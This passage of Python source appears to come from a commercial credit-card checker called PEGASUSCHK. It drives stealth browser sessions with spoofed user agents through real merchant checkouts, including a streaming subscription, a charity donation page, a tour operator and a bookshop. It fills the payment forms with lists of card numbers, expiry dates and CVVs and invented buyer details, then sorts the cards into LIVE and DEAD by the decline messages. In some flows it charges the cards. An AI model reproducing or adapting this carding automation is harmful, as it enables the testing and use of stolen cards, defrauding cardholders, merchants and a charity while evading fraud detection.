                #goodAgent = sb.get_text("//span[contains(@class, 'consistency-status-text') and contains(text(), 'consistent')]")
                #time.sleep(random.uniform(5, 15))
                #if not "consistent" in goodAgent:
                #    return "BAN"

                #sb.open(link)
                sb.driver.uc_open_with_reconnect(link, random_number)

                sb.type("//input[@type='email' and @placeholder='ejemplo@email.com']", email)
                time.sleep(random.uniform(1, 5))
                sb.type("//input[@type='password' and @placeholder='Contraseña']", "Pegasus123*")
                time.sleep(random.uniform(1, 5))
                sb.click("//button[@aria-label='consent']")
                #time.sleep(random.uniform(1, 5))
                #sb.click("//button[text()='Configuración de Rastreadores']")
                #time.sleep(random.uniform(1, 5))
                #sb.click("//div[@class='ot-tgl']//input[@name='ot-group-id-C0002']/following-sibling::label/span[@class='ot-switch-nob']")
                #time.sleep(random.uniform(1, 5))
                #sb.click("//div[@class='ot-tgl']//input[@name='ot-group-id-C0004']/following-sibling::label/span[@class='ot-switch-nob']")
                #time.sleep(random.uniform(1, 5))
                #sb.click("//div[@class='ot-tgl']//input[@name='ot-group-id-C0005']/following-sibling::label/span[@class='ot-switch-nob']")
                
                #sb.click("//button[text()='Ok']")

                sb.click("//button[@name='Comenzar']")

                try: #Intentando crear cuenta
                    sb.click("//button[span[text()='Tal vez luego']]")
                except:
                    # Iniciando login
                    sb.open("https://vix.com/es-es/iniciar-sesion")
                    cuenta = crawlerVix("GET", "")
                    print(cuenta)
                    email = cuenta.split(":")[0]
                    passwd = cuenta.split(":")[1]
                    sb.type("//input[@placeholder='ejemplo@email.com']", email)
                    sb.type("//input[@placeholder='Contraseña']", passwd)
                    sb.click("//button[text()='Iniciar sesión']")

                try: # Revisando BAN
                    sb.click("//a[text()='Suscríbete Ya']")
                except:
                    return "BAN"

                passwd = "Pegasus123*"

                setCuenta(email, passwd, "VIX")

                time.sleep(random.uniform(3, 4))

                sb.wait_for_element_clickable("//div[@role='button' and contains(., 'Mensual')]")
                sb.click("//div[@role='button' and contains(., 'Mensual')]")

                sb.type("//input[@id='Nombre']", self.first1)
                sb.type("//input[@id='Apellido(s)']", self.last1)

                contador = 0

                while self.cont < self.total_lines and contador <= 5:

                    time.sleep(random.uniform(3, 4))

                    # Organizando data de CC
                    ccs, mes, ano, ccn, typ = (
                    str(self.ccs[self.cont]).strip(),
                    str(self.mes[self.cont]).strip(),
                    str(self.anio[self.cont]).strip(),
                    str(self.cvv[self.cont]).strip(),
                    self.tools.bintype(self.ccs[self.cont])
                    )

                    brand = self.ccs[self.cont][0:1]
                    binCC = self.ccs[self.cont][0:6]

                    deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                    livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                    fecha = f"{mes}{ano[2:4]}"

                    sb.wait_for_element("//iframe[@title='Número de tarjeta']")
                    sb.switch_to_frame("//iframe[@title='Número de tarjeta']")
                    sb.type("//input[@id='recurly-hosted-field-input']", self.ccs[self.cont])
                    sb.switch_to_default_content()

                    sb.wait_for_element("//iframe[@title='MM']")
                    sb.switch_to_frame("//iframe[@title='MM']")
                    sb.type("//input[@id='recurly-hosted-field-input']", self.mes[self.cont])
                    sb.switch_to_default_content()

                    sb.wait_for_element("//iframe[@title='AA']")
                    sb.switch_to_frame("//iframe[@title='AA']")
                    sb.type("//input[@id='recurly-hosted-field-input']", self.anio[self.cont])
                    sb.switch_to_default_content()

                    sb.wait_for_element("//iframe[@title='CVV']")
                    sb.switch_to_frame("//iframe[@title='CVV']")
                    sb.type("//input[@id='recurly-hosted-field-input']", self.cvv[self.cont])
                    sb.switch_to_default_content()

                    sb.type("//input[@id='Código postal']", )

                    sb.click("//button[@type='button']")

                    sb.click("//button[@name='Iniciar suscripción']")

                    # Analizando resultados.
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                self.printed.emit(error_message)

        except Exception as e:

            self.text_changed.emit('ELIMINANDO RASTREADORES!')  
            exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
            self.printed.emit(error_message)
                        
            
    self.text_changed.emit('TESTEO FINALIZADO')

def petsmart(self):

    def intercept_response(request, response):
        print(f"Status Code: {response.status_code}")

        # Imprime el contenido de la respuesta
        try:
            # Esto debe ser una cadena de bytes, conviértela a texto si es necesario
            print("Response Body:")
            print(response.body.decode('utf-8'))  # Convierte a string (asumiendo que es UTF-8)
        except Exception as e:
            print(f"Error al obtener el contenido de la respuesta: {e}")

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        

        links = [
            'https://www.petsmart.com/dog/toys/fetch-toys/merry-and-brightandtrade-christmas-lights-tennis-ball-dog-toy-85194.html'
        ]

        link = random.choice(links)


        try:
            driver = Driver(wire=True)
            driver.response_interceptor = intercept_response
            driver.get(link)

            time.sleep(500)
            time.sleep(500)
            time.sleep(500)
            time.sleep(500)
            time.sleep(500)

        except Exception as e:

            self.text_changed.emit('ELIMINANDO RASTREADORES!') 
            exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
            self.printed.emit(error_message)
                
    self.text_changed.emit('TESTEO FINALIZADO')

def allhands(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    headless2 = getHeadless(self)
    user_agent, device_metrics = openBrowser(2, headless2)

    with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

        sb.save_screenshot_after_test = False
        sb.save_page_source_after_test = False

        if "Macintosh" in user_agent:

            platform = "MacIntel"

        elif "Windows" in user_agent:

            platform = "Win32"

        else:

            platform = "Linux"

        sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

            "userAgent": user_agent,
            "platform": platform,

        })
        
        sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

            "mobile": True,
            "width": device_metrics["width"],
            "height": device_metrics["height"],
            "deviceScaleFactor": device_metrics["deviceScaleFactor"],
            "fitWindow": True

        })

        self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

        try:

            if self.tools.validate_creditos(self.username,self.password) == True:
                self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                return None

            email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
            phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
            address = str(random.randint(100, 999)) + ' CALLE ' + str(random.randint(100, 999)) + 'SUR'
            fullname = self.first1 + ' ' + self.last1
            dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

            links = [
                'https://give.allhandsandhearts.org/campaign/561448/donate?'
            ]

            link = random.choice(links)
            
            print('USER AGENT ACTUAL:', sb.get_user_agent())


            try:
                sb.open(link)

                time.sleep(random.uniform(2, 4))

                amount = random.randint(4500, 10000)

                sb.select_option_by_value("#__next > header > div > select", "COP")
                time.sleep(random.uniform(2, 4))

                sb.press_keys("#other-donation-amount", str(amount))
                time.sleep(random.uniform(2, 4))
                sb.click("//a[contains(@href, 'checkout') and text()='Continue']")
                time.sleep(random.uniform(2, 4))
                sb.click("//button[@data-testid='paymethod-continue' and text()='Continue to card details']")
                time.sleep(random.uniform(2, 4))

                # Organizando data de CC
                ccs, mes, ano, ccn, typ = (
                str(self.ccs[self.cont]).strip(),
                str(self.mes[self.cont]).strip(),
                str(self.anio[self.cont]).strip(),
                str(self.cvv[self.cont]).strip(),
                self.tools.bintype(self.ccs[self.cont])
                )

                brand = self.ccs[self.cont][0:1]
                binCC = self.ccs[self.cont][0:6]

                self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')

                funds = "CHARGED"
                livemsg = f"LIVE|PEGASUSCHK|LEGACYCHARGED|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                deadmsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                fecha = f"{mes}{ano[2:4]}"
                
                sb.wait_for_element("//iframe[contains(@src, 'js.stripe.com/v3/elements-inner-payment')]")
                sb.switch_to_frame("//iframe[contains(@src, 'js.stripe.com/v3/elements-inner-payment')]")

                sb.type("//input[@id='Field-numberInput' and @name='number' and @placeholder='1234 1234 1234 1234']", self.ccs[self.cont])
                sb.type("//input[@id='Field-expiryInput' and @name='expiry' and @placeholder='MM / AA']", fecha)
                sb.type("//input[@id='Field-cvcInput' and @name='cvc']", self.cvv[self.cont])
                #sb.click("//button[@data-testid='paymethod-card-continue' and @data-id='paymethod-card-continue' and text()='Continue to options']")

                sb.switch_to_default_content()

                sb.click("//button[@data-testid='options-continue' and text()='Continue to information']")

                time.sleep(random.uniform(2, 4))

                sb.type("#firstName", self.first1, timeout=15)
                sb.type("#lastName", self.last1)
                sb.type("#email", email)
                sb.type("#addressLine1", address)
                sb.select_option_by_value("//select[@data-testid='country-select']", "CO")
                sb.type("#zipCode", "050012")
                sb.type("#city", "Medellin")
                sb.select_option_by_value("//select[@data-testid='state-select']", "ANT")
                time.sleep(random.uniform(2, 4))

                try:
                    sb.click("//button[@type='submit' and @data-testid='confirm-donate']")
                except:
                    btn = sb.wait_for_element_clickable("//button[@type='submit' and @data-testid='confirm-donate']")
                    sb.execute_script("arguments[0].click();", btn)

                try:
                    msgPay = sb.get_text("//div[@role='alert' and @aria-live='polite']", timeout=15)
                    print(msgPay)

                    if "error occurred" in msgPay or "error has occurred" in msgPay or "was declined" in msgPay or "please try again" in msgPay:
                        self.text_changed.emit('❌ La validación ha fallado. Por favor, verifica la información (EXTRA) y vuelve a intentarlo. ⚠️🔍')
                        self.text_live.emit(deadmsg)
                    else:
                        self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                        print(msgPay)
                        error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "RESPONSE:" + msgPay +"LINK ACTUAL:" + link
                        self.printed.emit(error_message)
                        time.sleep(500)

                except Exception as e:

                    if self.tools.repetir(livemsg) == True:
                        self.text_dead.emit(deadmsg)
                    else:
                        # Revisar charged
                        url = sb.get_current_url()
                        print(url)
                        if "thank-you" in url:
                            self.text_changed.emit('✅ Validación completada con éxito. ¡Resultados garantizados y seguros! 🎉🔒')
                            self.text_live.emit(livemsg)
                        else:
                            
                            try:
                                sb.wait_for_element("body > div:nth-child(1) > iframe", timeout=10)
                                self.text_changed.emit('❌ La validación ha fallado. Por favor, verifica la información (EXTRA) y vuelve a intentarlo. ⚠️🔍')
                                self.text_live.emit(deadmsg)

                            except:
                                try:

                                    sb.wait_for_element("//h1[span[1][contains(text(), 'Thank You for Donating!')]]", timeout=10)
                                    self.text_changed.emit('✅ Validación completada con éxito. ¡Resultados garantizados y seguros! 🎉🔒')
                                    self.text_live.emit(livemsg)

                                except Exception as e:

                                    self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                                    #error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                                    #self.printed.emit(error_message)
                                    time.sleep(500)

                    print("Error en:",e)
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)
                    time.sleep(500)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                self.printed.emit(error_message)

        except Exception as e:

            self.text_changed.emit('ELIMINANDO RASTREADORES!')  
            exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
            self.printed.emit(error_message)

def daviplata(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.google.com/search?q=recargar+daviplata'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)
                    time.sleep(2)
                    sb.click("//div[contains(@class, 'CCgQ5') and contains(., 'Recargar')]")
                    
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def alicante(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        if self.username == "timmysornerx":
            headless2 = False

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            #if "Macintosh" in user_agent:

            #    platform = "MacIntel"

            #elif "Windows" in user_agent:

            #    platform = "Win32"

            #else:

            #    platform = "Linux"

            #sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

            #    "userAgent": user_agent,
            #    "platform": platform,

            #})
            
            #sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

            #    "mobile": True,
            #    "width": device_metrics["width"],
            #    "height": device_metrics["height"],
            #    "deviceScaleFactor": device_metrics["deviceScaleFactor"],
            #    "fitWindow": True

            #})

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.privateshoretrips.com/alicante-shore-excursions-p/salic-01.htm'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                    sb.click("//input[@name='SELECT___SALIC-01___59']")
                    sb.click("#options_table > tbody > tr:nth-child(3) > td:nth-child(4) > input[type=radio]")
                    #sb.click("//input[@name='paymopt']")
                    sb.type("#datepicker", "12/31/2024")
                    sb.click("#ui-datepicker-div > div > a.ui-datepicker-next.ui-corner-all")
                    sb.click("#ui-datepicker-div > table > tbody > tr:nth-child(5) > td:nth-child(6) > a")
                    sb.type("//input[@id='datepicker']", "01/15/2025")
                    
                    sb.select_option_by_value("#options_table > tbody > tr:nth-child(4) > td.vol-option-items.vol-option-select > select", "9319") 
                    sb.select_option_by_value("#options_table > tbody > tr:nth-child(8) > td.vol-option-items.vol-option-select > select", "9777")
                    sb.select_option_by_value("#options_table > tbody > tr:nth-child(9) > td.vol-option-items.vol-option-select > select","9793")
                    sb.type("#options_table > tbody > tr:nth-child(10) > td.vol-option-items > input[type=text]", "Pegasus")
                    try:
                        sb.click("#btn_addtocart")
                    except:
                        sb.click("#proceed_btn")
                    sb.click("#btn_checkout_guest")

                    sb.wait_for_element("#emailAddress", timeout=15)
                    sb.type("#emailAddress", email)

                    contador = 0
                    while self.cont < self.total_lines and contador <= 9:

                        if contador == 0 or contador == 1:
                        # Form checkout
                            sb.wait_for_element("#firstName", timeout=10)
                            sb.type("#firstName", self.first1)
                            sb.type("#lastName", self.last1)
                            sb.type("#address1", address)
                            sb.type("#city", "Sunrise")
                            sb.type("#postalCode", "33351")
                            sb.select_option_by_value("#state", "FL")
                            sb.type("#phoneNumber", phone_number)

                            time.sleep(random.uniform(1, 2))

                            sb.click("//button[@data-testid='address-form-submit-button']")

                            sb.click("//button[@data-testid='button-input']")
                            time.sleep(random.uniform(1, 2))

                            sb.click("//button[@data-testid='button-input']")

                        # Inicio testeo

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]

                        self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')
                        if contador == 0:
                            sb.type("#password", "Pegasus123*")

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACYCHARGED|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                        
                        sb.wait_for_element("//iframe[starts-with(@name, 'spreedly-number-frame-')]", timeout=15)
                        sb.switch_to_frame("//iframe[starts-with(@name, 'spreedly-number-frame-')]")

                        sb.type("#card_number", self.ccs[self.cont])

                        sb.switch_to_default_content()
                        sb.type("#creditCard\.cardHolderName", fullname)

                        sb.select_option_by_value("#creditCard\.expMonth", self.mes[self.cont])
                        sb.select_option_by_value("#creditCard\.expYear", self.anio[self.cont])

                        sb.wait_for_element("//iframe[starts-with(@name, 'spreedly-cvv-frame-')]")
                        sb.switch_to_frame("//iframe[starts-with(@name, 'spreedly-cvv-frame-')]")

                        sb.type("#cvv", self.cvv[self.cont])

                        sb.switch_to_default_content()

                        sb.click("//button[@data-testid='button-input' and @type='submit']")

                        # Analizando frame 
                        try:
                            msgPay = sb.get_text("//div[@data-testid='formerrorlabel-input']", timeout=15)
                            print(msgPay)
                        except Exception as e:
                            if self.username == "ZenoxPav":
                                break
                            msgPay = ""
                            print("Error en:", e)
                            self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                            time.sleep(120)
                            break
                        
                        if (binCC == "530691" or binCC == "526557" or binCC == "542418" or binCC == "546616" or binCC == "414720") and "CVV" in msgPay:

                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                self.text_live.emit(livemsg)

                        elif "Payment declined" in msgPay:
                            self.text_dead.emit(deadmsg)

                        else:
                            self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                            time.sleep(120)
                            break
                            

                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        sb.refresh()

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def wix(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://users.wix.com/signin/signup/password?view=sign-up&sendEmail=true&loginCompName=SignUp_H&referralInfo=SignUp_H&postSignUp=https%3A%2F%2Fwww.wix.com%2Fnew%2Fintro%2F&postLogin=https%3A%2F%2Fmanage.wix.com%2Faccount%2Froute&loginDialogContext=signup&overrideLocale=es&originUrl=https%3A%2F%2Fmanage.wix.com%2Fpremium-purchase-plan%2Fdynamo%3F&forceRender=true'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)
                    sb.click("//input[contains(@data-hook, 'wsr-input') and @type='email']")
                    sb.type("//input[contains(@data-hook, 'wsr-input') and @type='text']", email)
                    sb.type("//div[@data-hook='signup.confirmEmail']//input[contains(@data-hook, 'wsr-input')]", email)
                    sb.type("//input[contains(@data-hook, 'wsr-input') and @type='password']", "Pegasus777*")
                    sb.click("//button[contains(@data-hook, 'signup.submit')]")
                    
                    time.sleep(random.uniform(5, 6))

                    sb.open("https://manage.wix.com/premium-purchase-plan/dynamo?")
                    print(email, "Pegasus777*")
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)
                    time.sleep(500)

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def laparta(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.txalaparta.eus/es/libros/repensar-la-guerra'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                    # Form address
                    sb.click("//div[contains(@class, 'c-buy__button')]//span[contains(text(), 'Comprar')]")
                    sb.click("//a[contains(text(), 'Finalizar pedido')]")
                    sb.click("//label[@for='orders-payment-method-8']")
                    sb.type("//input[@name='Orders[adr_invoice_email]' and @type='text']", email)
                    sb.type("//input[@name='Orders[adr_delivery_firstname]' and @type='text']", fullname)
                    sb.type("//input[@name='Orders[adr_delivery_address]' and @type='text']", address)
                    sb.type("//input[@name='Orders[adr_delivery_city]' and @type='text']", "Sunrise")
                    sb.select_option_by_value("//select[@name='Orders[adr_delivery_country_id]']", "275")
                    time.sleep(random.uniform(2, 3))
                    sb.select_option_by_value("//select[@name='Orders[adr_delivery_state_id]' and @id='orders-adr-delivery-state-id']", "537")
                    sb.type("//input[@id='orders-adr-invoice-vat-number']", dni)
                    sb.type("//input[@id='order-adr_delivery_phone']", phone_number)
                    sb.type("//input[@id='orders-adr-delivery-postcode']", "33351")


                    # Form Payment

                    contador = 0
                    while self.cont < self.total_lines and contador <= 9:

                        # Inicio testeo

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]

                        self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')

                        deadmsg = f"DEAD|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
